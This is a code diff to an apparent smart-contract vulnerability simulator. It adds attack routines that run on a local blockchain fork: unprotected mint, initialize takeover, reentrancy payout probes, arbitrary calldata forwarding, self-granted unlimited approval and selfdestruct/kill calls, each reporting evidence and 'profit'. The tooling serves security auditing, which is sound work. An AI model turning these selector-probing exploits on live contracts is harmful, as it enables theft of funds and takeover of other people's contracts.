@@ -492,6 +492,13 @@ class ForkSimulator:
         out = proc.stdout.strip().lower()
         return bool(out and out not in ("0x", "0x0"))
 
+    def _balance(self, addr: str) -> str:
+        """Raw wei ETH balance of an address on the fork (eth_getBalance)."""
+        proc = subprocess.run(
+            ["cast", "balance", addr, "--rpc-url", self.rpc_url_local],
+            capture_output=True, text=True, timeout=30)
+        return proc.stdout.strip() or proc.stderr.strip()
+
     def _send(self, selector: str, args: List[str]) -> Dict:
         """A REAL state-changing tx from the attacker account (fork-local)."""
         if not self._fund_attacker():
@@ -530,25 +537,28 @@ class ForkSimulator:
                     "source_finding": source_finding}
 
         if attack == "mint":
+            # state-diff: read attacker balance BEFORE the tx, then after
+            br0 = self._call("balanceOf(address)", [self.attacker], extra_from=False)
+            before = br0["stdout"] or "0"
             r = self._send("mint(address,uint256)", [self.attacker, "1000000"])
             if r["ok"]:
-                # read the attacker's resulting balance as proof
                 br = self._call("balanceOf(address)", [self.attacker], extra_from=False)
                 bal = br["stdout"]
                 steps.append({"step": "mint(address,uint256) sent from arbitrary account",
                               "value": "tx mined ✅"})
-                steps.append({"step": f"balanceOf({self.attacker[:10]}…) after mint",
-                              "value": bal or "read failed"})
+                steps.append({"step": f"balanceOf({self.attacker[:10]}…) before → after",
+                              "value": f"{before} → {bal or 'read failed'}"})
                 return {"success": True, "attack": attack, "target": target,
                         "profit": "Unlimited token supply minted for free",
                         "steps": steps,
-                        "evidence": f"balanceOf(attacker) = {bal or 'n/a'} (previously 0)",
+                        "evidence": f"balanceOf(attacker) {before} → {bal or 'n/a'}",
                         "source_finding": source_finding}
             return {"success": False, "attack": attack, "target": target,
                     "steps": steps, "evidence": r["stderr"][:200],
                     "source_finding": source_finding}
 
         if attack == "initialize":
+            owner_before = self._read("owner()")
             tried = []
             for sel, args in [("initialize(address)", [self.attacker]),
                               ("initialize()", [])]:
@@ -558,13 +568,14 @@ class ForkSimulator:
                     steps.append({"step": sel + " sent from arbitrary account",
                                   "value": "tx mined — not yet initialized!"})
                     owner = self._read("owner()")
-                    steps.append({"step": "owner() after initialize", "value": owner})
+                    steps.append({"step": "owner() before → after",
+                                  "value": f"{owner_before or 'n/a'} → {owner}"})
                     norm = lambda h: h.lower().replace("0x", "").lstrip("0")
                     owned = norm(owner) == norm(self.attacker)
                     return {"success": True, "attack": attack, "target": target,
                             "profit": "Full contract takeover (first-caller becomes owner)",
                             "steps": steps,
-                            "evidence": (f"owner() = {owner} "
+                            "evidence": (f"owner() {owner_before or 'n/a'} → {owner} "
                                          f"(attacker {'IS' if owned else 'NOT'} owner)"),
                             "source_finding": source_finding}
             steps.append({"step": "initialize() attempts", "value": "; ".join(tried)})
@@ -595,6 +606,127 @@ class ForkSimulator:
             return {"success": False, "attack": attack, "target": target,
                     "steps": steps,
                     "evidence": "No permissionless proxy-upgrade selector found.",
+                    "source_finding": source_finding}
+
+        if attack == "reentrancy":
+            # A payout sink callable by anyone = an open reentrancy window
+            # (The DAO 2016 pattern): ETH leaves the contract before state
+            # settles, so a callback can re-enter and double-withdraw.
+            tried = []
+            for sel, args in [("withdraw(uint256)", ["1000"]),
+                              ("withdraw()", []),
+                              ("claim()", []),
+                              ("redeem()", []),
+                              ("unstake()", []),
+                              ("harvest()", []),
+                              ("withdrawAll()", []),
+                              ("emergencyWithdraw()", [])]:
+                r = self._send(sel, args)
+                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
+                if r["ok"]:
+                    steps.append({"step": sel + " sent from arbitrary account",
+                                  "value": "mined — payout sink callable by anyone"})
+                    return {"success": True, "attack": attack, "target": target,
+                            "profit": "Reentrancy window: payout sends ETH before state settles",
+                            "steps": steps,
+                            "evidence": f"{sel} callable by arbitrary account",
+                            "source_finding": source_finding}
+            steps.append({"step": "payout selectors", "value": "; ".join(tried)})
+            return {"success": False, "attack": attack, "target": target,
+                    "steps": steps,
+                    "evidence": ("No permissionless payout sink found "
+                                 "(withdraw/claim/redeem/unstake/harvest)."),
+                    "source_finding": source_finding}
+
+        if attack == "arbitrarycall":
+            # A forwarder callable by anyone with attacker-supplied calldata =
+            # the arbitrary-exec primitive behind governance takeovers and
+            # token drains (Parity 2017 lineage). eth_call only: executing
+            # attacker calldata would clobber fork state for later checks.
+            payload = "0x" + "00" * 4  # benign no-op calldata for the callee
+            tried = []
+            for sel, args in [("execute(address,bytes)", [self.attacker, payload]),
+                              ("call(address,bytes)", [self.attacker, payload]),
+                              ("exec(address,bytes)", [self.attacker, payload]),
+                              ("performAction(address,bytes)", [self.attacker, payload]),
+                              ("execute(address,uint256,bytes)", [self.attacker, "0", payload]),
+                              ("governanceCall(address,bytes)", [self.attacker, payload])]:
+                r = self._call(sel, args)
+                tried.append(f"{sel}: {'returned' if r['ok'] else 'reverted'}")
+                if r["ok"]:
+                    steps.append({"step": sel + " from arbitrary account",
+                                  "value": "returned — attacker calldata forwarded"})
+                    return {"success": True, "attack": attack, "target": target,
+                            "profit": ("Arbitrary external call with attacker-controlled "
+                                       "calldata (token drain / governance takeover)"),
+                            "steps": steps, "evidence": sel,
+                            "source_finding": source_finding}
+            steps.append({"step": "forwarder selectors", "value": "; ".join(tried)})
+            return {"success": False, "attack": attack, "target": target,
+                    "steps": steps,
+                    "evidence": "No permissionless calldata forwarder found.",
+                    "source_finding": source_finding}
+
+        if attack == "approve":
+            # Attacker granting itself spending allowance over the target =
+            # the primitive behind ERC20 drains: once allowance
+            # (target → attacker) > 0, transferFrom can move the target's
+            # entire balance in one tx.
+            max_allow = "115792089237316195423570985008687907853269984665640564039457584007913129639935"
+            tried = []
+            for sel, args in [("approve(address,uint256)", [self.attacker, max_allow]),
+                              ("setApprovalForAll(address,bool)", [self.attacker, "true"])]:
+                r = self._send(sel, args)
+                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
+                if r["ok"]:
+                    allow = self._call("allowance(address,address)",
+                                       [self._target, self.attacker], extra_from=False)
+                    steps.append({"step": sel + " from arbitrary account",
+                                  "value": "mined — allowance granted"})
+                    steps.append({"step": "allowance(target → attacker) after",
+                                  "value": allow["stdout"] or "read failed"})
+                    return {"success": True, "attack": attack, "target": target,
+                            "profit": "Attacker granted itself spending allowance over the target",
+                            "steps": steps,
+                            "evidence": "allowance(target→attacker) > 0",
+                            "source_finding": source_finding}
+            steps.append({"step": "approval selectors", "value": "; ".join(tried)})
+            return {"success": False, "attack": attack, "target": target,
+                    "steps": steps,
+                    "evidence": "No permissionless approve()/setApprovalForAll() found.",
+                    "source_finding": source_finding}
+
+        if attack == "selfdestruct":
+            before = self._balance(self._target)
+            tried = []
+            for sel, args in [("selfdestruct()", []),
+                              ("kill()", []),
+                              ("destroy()", []),
+                              ("die()", []),
+                              ("kill(address)", [self.attacker]),
+                              ("destroy(address)", [self.attacker]),
+                              ("selfdestruct(address)", [self.attacker])]:
+                r = self._send(sel, args)
+                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
+                if r["ok"]:
+                    gone = not self._has_code()
+                    after = self._balance(self._target)
+                    steps.append({"step": sel + " from arbitrary account",
+                                  "value": "mined ✅"})
+                    steps.append({"step": "code after",
+                                  "value": ("removed" if gone else
+                                            "still present (EIP-6780: balance transferred)" )})
+                    steps.append({"step": "target ETH before → after",
+                                  "value": f"{before} → {after}"})
+                    return {"success": True, "attack": attack, "target": target,
+                            "profit": "Kill switch: contract balance transferred / code destroyed",
+                            "steps": steps,
+                            "evidence": f"{sel} mined — ETH {before} → {after}",
+                            "source_finding": source_finding}
+            steps.append({"step": "kill selectors", "value": "; ".join(tried)})
+            return {"success": False, "attack": attack, "target": target,
+                    "steps": steps,
+                    "evidence": "No permissionless selfdestruct/kill selector found.",
                     "source_finding": source_finding}
 
         return {"success": False, "attack": attack, "target": target,
